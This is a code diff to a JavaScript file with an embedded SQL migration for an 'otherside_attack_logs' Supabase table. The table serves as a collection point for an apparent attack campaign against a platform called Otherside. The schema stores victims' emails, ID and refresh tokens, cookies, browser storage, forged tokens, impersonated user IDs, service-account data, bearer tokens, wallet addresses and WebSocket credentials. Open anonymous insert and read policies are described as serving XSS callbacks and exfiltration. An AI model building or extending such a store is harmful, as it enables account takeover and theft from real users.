@@ -11,74 +11,98 @@ const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY ||
 // SQL Migration for otherside_attack_logs table
 // ============================================================
 const MIGRATION_SQL = `
--- Create the otherside_attack_logs table
+-- ============================================================
+-- Table: otherside_attack_logs
+-- All columns use os_ prefix (separate from stolen_tokens table)
+-- This table stores data from the Otherside Native Attack Dashboard
+-- ============================================================
 CREATE TABLE IF NOT EXISTS otherside_attack_logs (
     id BIGSERIAL PRIMARY KEY,
-    created_at TIMESTAMPTZ DEFAULT NOW(),
-    attack_type TEXT NOT NULL,
-    victim_email TEXT,
-    victim_uid TEXT,
-    victim_name TEXT,
-    victim_picture_url TEXT,
-    id_token TEXT,
-    refresh_token TEXT,
-    cookies TEXT,
-    local_storage TEXT,
-    session_storage TEXT,
-    notes TEXT,
-    xss_target TEXT,
-    xss_payload TEXT,
-    idor_data JSONB,
-    firebase_api_key TEXT,
-    attack_vector TEXT,
-    endpoint_tested TEXT,
-    response_status INTEGER,
-    response_error TEXT,
-    identity_toolkit_response JSONB,
-    custom_token TEXT,
-    forged_id_token TEXT,
-    forged_refresh_token TEXT,
-    impersonated_uid TEXT,
-    admin_access_granted BOOLEAN DEFAULT FALSE,
-    service_account_email TEXT,
-    service_account_project_id TEXT,
-    service_account_client_id TEXT,
-    service_account_full JSONB
+    os_capture_timestamp TIMESTAMPTZ DEFAULT NOW(),
+
+    -- Attack metadata
+    os_attack_phase TEXT NOT NULL DEFAULT 'unknown',
+    os_vuln_severity TEXT DEFAULT 'info',
+    os_research_notes TEXT,
+    os_source_domain TEXT,
+    os_operator_agent TEXT,
+    os_operator_screen TEXT,
+    os_operator_language TEXT,
+    os_operator_timezone TEXT,
+    os_operator_referrer TEXT,
+
+    -- Phase 1: Glyph Auth
+    os_glyph_client_id TEXT,
+    os_glyph_redirect_target TEXT,
+    os_oidc_discovery_data JSONB,
+    os_oidc_jwt_raw TEXT,
+    os_oidc_token_claims JSONB,
+    os_oidc_token_issuer TEXT,
+    os_oidc_token_expiry TIMESTAMPTZ,
+    os_exchange_response JSONB,
+    os_fb_bridge_response JSONB,
+    os_wallet_addr TEXT,
+    os_siwe_message_content TEXT,
+
+    -- Phase 2: Agentic API
+    os_bearer_token TEXT,
+    os_api_route TEXT,
+    os_request_method TEXT,
+    os_request_payload JSONB,
+    os_api_response JSONB,
+    os_http_status INTEGER,
+    os_endpoint_map JSONB,
+
+    -- Phase 3: Morpheus Network
+    os_ws_endpoint TEXT,
+    os_ws_auth_credential TEXT,
+    os_infra_probe_result JSONB,
+    os_captured_packet JSONB,
+
+    -- Phase 4: Native Client
+    os_native_credential TEXT,
+    os_client_api_map JSONB,
+
+    -- Phase 5: Pixel Streaming
+    os_streaming_infra JSONB
 );
 
 -- Enable Row Level Security
 ALTER TABLE otherside_attack_logs ENABLE ROW LEVEL SECURITY;
 
--- Policy: Allow anonymous inserts (for client-side XSS callback payloads)
-CREATE POLICY "Allow anonymous inserts" ON otherside_attack_logs
+-- Policy: Allow anonymous inserts (for dashboard client-side saves)
+CREATE POLICY "Allow anonymous inserts on otherside_attack_logs" ON otherside_attack_logs
     FOR INSERT
     TO anon
     WITH CHECK (true);
 
--- Policy: Allow anonymous reads (for PoC data exfiltration verification)
-CREATE POLICY "Allow anonymous reads" ON otherside_attack_logs
+-- Policy: Allow anonymous reads (for dashboard results display)
+CREATE POLICY "Allow anonymous reads on otherside_attack_logs" ON otherside_attack_logs
     FOR SELECT
     TO anon
     USING (true);
 
 -- Policy: Allow service role full access
-CREATE POLICY "Allow service role full access" ON otherside_attack_logs
+CREATE POLICY "Allow service role full access on otherside_attack_logs" ON otherside_attack_logs
     FOR ALL
     TO service_role
     USING (true)
     WITH CHECK (true);
 
--- Index for fast lookups by attack_type
-CREATE INDEX IF NOT EXISTS idx_attack_logs_attack_type ON otherside_attack_logs(attack_type);
+-- Index for fast lookups by attack phase
+CREATE INDEX IF NOT EXISTS idx_os_attack_phase ON otherside_attack_logs(os_attack_phase);
 
--- Index for fast lookups by victim_uid
-CREATE INDEX IF NOT EXISTS idx_attack_logs_victim_uid ON otherside_attack_logs(victim_uid);
+-- Index for fast lookups by timestamp
+CREATE INDEX IF NOT EXISTS idx_os_capture_timestamp ON otherside_attack_logs(os_capture_timestamp DESC);
 
--- Index for fast lookups by created_at
-CREATE INDEX IF NOT EXISTS idx_attack_logs_created_at ON otherside_attack_logs(created_at DESC);
+-- Index for fast lookups by severity
+CREATE INDEX IF NOT EXISTS idx_os_vuln_severity ON otherside_attack_logs(os_vuln_severity);
 
--- Index for fast lookups by attack_vector
-CREATE INDEX IF NOT EXISTS idx_attack_logs_attack_vector ON otherside_attack_logs(attack_vector);
+-- Index for fast lookups by wallet address
+CREATE INDEX IF NOT EXISTS idx_os_wallet_addr ON otherside_attack_logs(os_wallet_addr);
+
+-- Index for fast lookups by API route
+CREATE INDEX IF NOT EXISTS idx_os_api_route ON otherside_attack_logs(os_api_route);
 `;
 
 // ============================================================
